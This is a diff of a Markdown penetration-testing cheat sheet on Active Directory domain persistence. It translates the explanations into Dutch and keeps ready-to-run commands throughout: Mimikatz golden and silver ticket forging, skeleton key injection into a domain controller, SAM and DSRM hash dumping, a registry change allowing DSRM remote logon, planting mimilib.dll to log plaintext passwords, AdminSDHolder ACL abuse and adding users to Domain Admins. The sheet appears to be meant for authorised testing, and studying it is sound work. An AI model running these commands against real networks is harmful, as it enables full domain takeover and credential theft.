@@ -502,7 +502,7 @@ lsadump::sam SamBkup.hiv SystemBkup.hiv
 
 # Domain persistence
 ## Golden ticket
-The krbtgt user hash could be used to impersonate any user with any privileges from even a non domain machine.
+Golden tickets zijn nagemaakte TGT tickets. TGT tickets worden gebruikt om TGS tickets aan te vragen bij de KDC(DC). De kerberos Golden Ticket is een valid TGT omdat deze ondertekend is door het KRBTGT account. Als je de hash van de KRBTGT account kan achterhalen door de hashes te dumpen op de Domain controller en deze hash niet wijzigt is het mogelijk om weer een TGT aan te vragen bij de volgende penetratietest en volledige toegang tot het domein te verkrijgen.
 
 #### Dump hashes - Get the krbtgt hash
 ```
@@ -540,7 +540,8 @@ ls \\<servername>\c$\
 ```
 
 #### Make silver ticket for Host
-Use the hash of the local computer
+Silver tickets zijn nagemaakte TGS tickets. Omdat de ticket is nagemaakt op de workstation is er geen communicatie met de DC. Eeen silver ticket kan worden aangemaakt met de service account hash of computer account hash.
+https://adsecurity.org/?p=2011
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
 ```
@@ -566,16 +567,15 @@ Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
 ```
 
 ## Skeleton key
-Access any machine with the password mimikatz
-Leaves a big gap in their security because you can login on any user with the password "mimikatz"
+De skeleton key attack is een aanval dat malware in het geheugen laad van de domain controller. Waarna het mogelijk is om als elke user the authenticeren met een master wachtwoord. Als je dit met mimikatz uitvoert is dit wachwoord 'mimikatz'. Dit laad een grote security gat waarbij dit wordt uitgevoerd! Voer dit dus niet uit in een productieomgeving zonder goed te overleggen met de klant. Om deze aanval te stoppen moet de domain controller worden herstart.
 
-#### Create the skeleton key - Requires DA admin
+#### Create the skeleton key - Requires DA
 ```
 Invoke-MimiKatz -Command '"privilege::debug" "misc::skeleton"' -Computername <target>
 ```
 
 ## DSRM
-Directory Services Restore Mode
+De Directory Services Restore Mode is een boot option waarin een domain controller kan worden opgestart zodat een administrator reparaties of een recovery kan uitvoeren op de active directory database. Dit wachtwoord wordt ingesteld tijdens het installeren van de domain controller en wordt daarna bijna nooit gewijzigd. Door de login behavior aan te passen van dit lokale account is het mogelijk om remote toegang te verkrijgen via dit account, een account waarvan het wachtwoord bijna nooit wijzigd! Pas op, dit tast de security van de domain controller aan!
 
 #### Dump DSRM password - dumps local users
 look for the local administrator password
@@ -587,6 +587,7 @@ Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computer
 ```
 New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
 ```
+
 #### If property already exists
 ```
 Set-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2
@@ -598,7 +599,9 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<computer> /user:Administrator 
 ```
 
 ## Custom SSP - Track logons
-A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP packages by Microsoft are: NTLM, Kerberos, Wdigest, credSSP. Mimikatz provides a custom SSP – mimilib.dll . This SSP logs local logons, service account and machine account passwords in clear text on the target server.
+Het is mogelijk om met een custom Security Support Provider (SSP) alle logons op een computer bij te houden. Een SSP is een DDL. Een SSP is een DLL waarmee een applicatie een geverifieerde verbinding kan verkrijgen. Sommige SSP-pakketten van Microsoft zijn: NTLM, Kerberos, Wdigest, credSSP. 
+
+Mimikatz biedt een aangepaste SSP - mimilib.dll aan. Deze SSP registreert lokale aanmeldingen, serviceaccount- en computeraccountwachtwoorden in platte tekst op de doelserver.
 
 #### Mimilib.dll
 Drop mimilib.dll to system32 and add mimilib to HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
@@ -617,9 +620,11 @@ Invoke-Mimikatz -Command ‘”misc:memssp”’
 
 ## ACL
 ### AdminSDHolder
+De AdminSDHolder container is een speciale AD container met default security permissies die gebruikt worden als template om beveiligde AD gebruikers en groepen (Domain Admins, Enterprise Admins etc.) te beveiligen en te voorkomen dat hier onbedoeld wijzingen aan worden uitgevoerd. Nadater er toegang is verkregen tot een DA is het mogelijk om deze container aan te passen voor persistence.
+
 #### Check if student has replication rights
 ```
-Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "student244") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
+Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
 ```
 
 #### Add fullcontrol permissions for a user to the adminSDHolder
@@ -627,7 +632,7 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 Add-ObjectAcl -TargetADSprefix ‘CN=AdminSDHolder,CN=System’ PrincipalSamAccountName <username> -Rights All -Verbose
 ```
 
-#### Run SDProp op AD
+#### Run SDProp on AD (Force the sync of AdminSDHolder)
 ```
 Invoke-SDPropagator -showProgress -timeoutMinutes 1
 
@@ -635,7 +640,7 @@ Invoke-SDPropagator -showProgress -timeoutMinutes 1
 Invoke-SDpropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
 ```
 
-#### Check domain admin privileges as normal user
+#### Check if user got generic all against domain admins group
 ```
 Get-ObjectAcl -SamaccountName “Domain Admins” –ResolveGUIDS | ?{$_.identityReference -match ‘<username>’}
 ```
@@ -643,6 +648,12 @@ Get-ObjectAcl -SamaccountName “Domain Admins” –ResolveGUIDS | ?{$_.identit
 #### Add user to domain admin group
 ```
 Add-DomainGroupMember -Identity ‘Domain Admins’ -Members <username> -Verbose
+```
+
+or
+
+```
+Net group "domain admins" sportless /add /domain
 ```
 
 #### Abuse resetpassword using powerview_dev
